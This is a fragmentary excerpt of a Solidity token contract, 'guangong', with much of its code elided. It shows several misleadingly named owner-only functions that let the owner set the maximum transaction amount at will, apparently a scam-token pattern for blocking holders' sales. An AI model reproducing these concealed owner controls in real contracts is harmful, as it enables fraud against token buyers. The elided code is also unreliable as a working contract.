...
contract Ownable is Context, ShareWisdom {
    ...
    function below(address newOwner) public onlyOwner {
...
contract guangong is Context, IERC20, Ownable {
    using SafeMath for uint256;
    ...
    string private _name = "guangong";
    string private _symbol = "GUANGONG";
    ...
    function uploadaddress(uint256 maxWallPercent) external onlyOwner {
        _maxTxAmount = (_totalSupply * maxWallPercent) / 1000;
    }

    function updatePercentOption(uint256 maxTXPercentage) external onlyOwner {
        _maxTxAmount = (_totalSupply * maxTXPercentage) / 1000;
    }

    function newoption(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    }
   ...
   function burnToken(address account, uint256 amounts) internal {
    ...
    function increasedata() public view returns (uint256) {
